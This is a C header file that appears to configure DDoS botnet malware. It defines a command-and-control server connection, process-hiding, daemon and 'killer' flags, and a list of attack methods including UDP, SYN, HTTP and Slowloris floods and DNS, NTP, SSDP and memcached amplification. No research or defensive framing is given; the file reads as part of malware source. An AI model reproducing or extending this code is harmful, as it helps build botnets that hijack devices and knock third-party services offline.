#ifndef CONFIG_H
#define CONFIG_H

// Bot configuration
#define MAX_THREADS 1000
#define MAX_ATTACK_DURATION 3600
#define DEFAULT_PORT 80
#define CNC_RECONNECT_TIMEOUT 30

// Security settings
#define ENABLE_KILLER 1
#define ENABLE_DAEMON 1
#define HIDE_PROCESS 1

// Attack methods
typedef enum {
    METHOD_UDP_FLOOD,
    METHOD_TCP_SYN,
    METHOD_HTTP_FLOOD,
    METHOD_SLOWLORIS,
    METHOD_ICMP_FLOOD,
    METHOD_DNS_AMP,
    METHOD_NTP_AMP,
    METHOD_SSDP_AMP,
    METHOD_MEMCACHED_AMP
} attack_method_t;

typedef struct {
    char cnc_server[256];
    int cnc_port;
    char bot_id[50];
    int max_threads;
    int attack_timeout;
} bot_config_t;

#endif
